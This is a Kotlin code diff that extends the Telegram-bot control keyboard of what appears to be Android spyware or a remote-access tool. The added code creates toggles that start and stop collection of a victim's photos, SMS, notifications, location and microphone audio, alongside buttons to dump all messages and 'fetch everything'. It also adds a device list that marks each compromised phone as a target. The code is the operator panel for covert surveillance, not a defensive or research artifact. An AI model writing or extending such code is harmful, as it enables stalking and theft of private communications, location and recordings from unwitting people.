@@ -5,6 +5,18 @@ import org.json.JSONObject
 
 object KeyboardBuilder {
 
+    // حالة الأزرار (Toggle)
+    @Volatile
+    var photosOn = false
+    @Volatile
+    var smsOn = false
+    @Volatile
+    var notifsOn = false
+    @Volatile
+    var locationOn = false
+    @Volatile
+    var audioOn = false
+
     fun replyKeyboard(): JSONObject {
         val keyboard = JSONArray()
 
@@ -14,13 +26,18 @@ object KeyboardBuilder {
         })
 
         keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "🖼 آخر 200"))
+            put(JSONObject().put("text", if (photosOn) "🔴 إيقاف الصور" else "🟢 تشغيل الصور"))
             put(JSONObject().put("text", "🎵 كل الموسيقى"))
         })
 
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "📩 كل الرسائل"))
-            put(JSONObject().put("text", "🔔 الإشعارات"))
+            put(JSONObject().put("text", if (smsOn) "🔴 إيقاف SMS" else "🟢 تشغيل SMS"))
+        })
+
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", if (notifsOn) "🔴 إيقاف الإشعارات" else "🟢 تشغيل الإشعارات"))
+            put(JSONObject().put("text", "🔔 عرض الإشعارات"))
         })
 
         keyboard.put(JSONArray().apply {
@@ -30,7 +47,12 @@ object KeyboardBuilder {
 
         keyboard.put(JSONArray().apply {
             put(JSONObject().put("text", "📊 معلومات الجهاز"))
-            put(JSONObject().put("text", "📍 الموقع"))
+            put(JSONObject().put("text", if (locationOn) "🔴 إيقاف الموقع" else "🟢 تشغيل الموقع"))
+        })
+
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", if (audioOn) "🔴 إيقاف المايك" else "🟢 تشغيل المايك"))
+            put(JSONObject().put("text", "📍 عرض الموقع"))
         })
 
         keyboard.put(JSONArray().apply {
@@ -39,11 +61,7 @@ object KeyboardBuilder {
         })
 
         keyboard.put(JSONArray().apply {
-            put(JSONObject().put("text", "🎤 بدء التسجيل"))
-            put(JSONObject().put("text", "⏹ إيقاف التسجيل"))
-        })
-
-        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "📱 قائمة الأجهزة"))
             put(JSONObject().put("text", "🚀 جلب كل شي"))
         })
 
@@ -56,4 +74,23 @@ object KeyboardBuilder {
     }
 
     fun backToMenu(): JSONObject = replyKeyboard()
+
+    fun deviceListKeyboard(devices: List<Pair<String, String>>): JSONObject {
+        val keyboard = JSONArray()
+        for ((id, name) in devices) {
+            keyboard.put(JSONArray().apply {
+                put(JSONObject().put("text", "🎯 $name"))
+                put(JSONObject().put("text", "@$id"))
+            })
+        }
+        keyboard.put(JSONArray().apply {
+            put(JSONObject().put("text", "🌐 كل الأجهزة"))
+            put(JSONObject().put("text", "🏠 القائمة"))
+        })
+        return JSONObject().apply {
+            put("keyboard", keyboard)
+            put("resize_keyboard", true)
+            put("is_persistent", true)
+        }
+    }
 }
